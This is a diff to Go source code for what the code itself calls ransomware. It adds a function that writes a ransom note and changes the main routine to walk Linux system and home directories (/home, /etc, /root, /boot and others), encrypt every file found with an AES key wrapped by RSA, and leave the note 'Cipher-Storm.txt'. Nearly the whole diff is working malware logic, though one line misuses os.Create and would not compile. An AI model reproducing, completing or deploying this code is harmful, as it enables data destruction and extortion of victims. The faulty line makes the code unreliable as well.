@@ -150,20 +150,38 @@ func traverse(drive string) error {
 	return nil
 }
 
+func ransom(file_name string ) error {
+    _ransom := `
+    This is a ransomeware that crypts all the data in the victims pc.
+    All the files are crypted using a public key named CipherStorm_keys.txt .
+    Deleting that file permanently crypts all your files. So i wouldn't recommend doing that.`
+
+    err := os.Create(file_name)
+    if err != nil {
+        return err
+    }
+
+    err = os.WriteFile(file_name , []byte(_ransom) , 0777)
+    if err != nil {
+        return err
+    }
+    return nil
+}
+
 func main() {
-	for i := 65; i < 91; i++ {
-		drive := string(rune(i)) + ":\\\\"
-		_, err := os.Stat(drive)
-		if err == nil {
-			traverse(drive)
-		}
-	}
+	drives := []string{"/home" , "/usr" , "/etc" , "/root" , "/opt" , "/lib" , 
+        "/boot" , "/sbin" , "/bin" , "/var" , "/mnt" , "/media" , "/tmp" }
+
+    for _, drive := range(drives) {
+        traverse(drive)
+    }
 
 	aes_gen_password := aes_password_generator()
 	rsa_encode(aes_gen_password)
 
-	for i := range FILES {
-		encrypt_file(FILES[i], aes_gen_password)
+    for _,file := range FILES {
+		encrypt_file(file, aes_gen_password)
 	}
-
+    
+    ransom("Cipher-Storm.txt")
 }
